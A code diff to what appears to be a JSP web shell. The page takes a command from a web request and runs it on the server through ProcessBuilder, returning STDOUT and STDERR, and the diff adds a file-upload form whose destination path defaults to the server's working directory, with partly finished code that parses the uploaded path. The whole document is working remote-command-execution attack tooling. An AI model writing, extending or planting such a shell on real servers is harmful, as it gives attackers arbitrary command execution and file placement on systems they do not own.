@@ -58,6 +58,47 @@ You may want to prefix your command with <code>cmd /c</code> or <code>bash -c</c
 STDERR will automatically be redirected to STDOUT for you. Newlines may be translated by server's local platform.
 </p>
 
+<form action="" method="POST" enctype="multipart/form-data">
+<label>Destination File path and filename:</label><input type="text" name="filepath" size="100" value="<%= clean(System.getProperty("user.dir")) %><%= clean(System.getProperty("file.separator")) %>"/><br />
+<input type="file" name="file" size="100" /><br />
+<br />
+<input type="submit" value="Upload"/>
+</form>
+
+<hr />
+<pre>
+<%
+	if("POST".equals(request.getMethod())) {
+		String requestContent = "";
+		
+		final BufferedReader requestReader = new BufferedReader(new InputStreamReader(request.getInputStream()));
+		for(String cLine = requestReader.readLine(); null != cLine; cLine = requestReader.readLine()) {
+			requestContent += cLine + System.getProperty("line.separator");
+		}
+		requestReader.close();
+		
+		final String boundary = requestContent.split(System.lineSeparator(), 2)[0];
+		
+		
+		int startPosition = requestContent.indexOf("Content-Disposition: form-data; name=\"filepath\"");
+		startPosition += "Content-Disposition: form-data; name=\"filepath\"".length();
+		startPosition += "\r\n".length();
+		startPosition += "\r\n".length();
+		
+		int endPosition = requestContent.indexOf(boundary, startPosition);
+		endPosition -= "\r\n".length();
+		
+		final String filepath = requestContent.substring(startPosition, endPosition);
+		
+		out.println("Writing to destination:  " + filepath);
+		
+		out.println();
+		
+		out.println("|||" + requestContent + "|||");
+
+	}
+%>
+
 <h3>Command Output (STDOUT & STDERR)</h3>
 <pre>
 <%
@@ -71,7 +112,7 @@ STDERR will automatically be redirected to STDOUT for you. Newlines may be trans
 		pb.redirectErrorStream(true);
 		final Process p = pb.start();
 		p.getOutputStream().close();  // close STDIN
-		final DataInputStream stdout = new DataInputStream(p.getInputStream());
+		final BufferedReader stdout = new BufferedReader(new InputStreamReader(p.getInputStream()));
 		for(String cLine = stdout.readLine(); null != cLine; cLine = stdout.readLine()) {
 			out.println(clean(cLine));
 		}
@@ -83,7 +124,6 @@ STDERR will automatically be redirected to STDOUT for you. Newlines may be trans
 		out.print("Exit code was:  " + p.exitValue());
 		out.println("</i>");
 	}
-
 %>
 </pre>
 
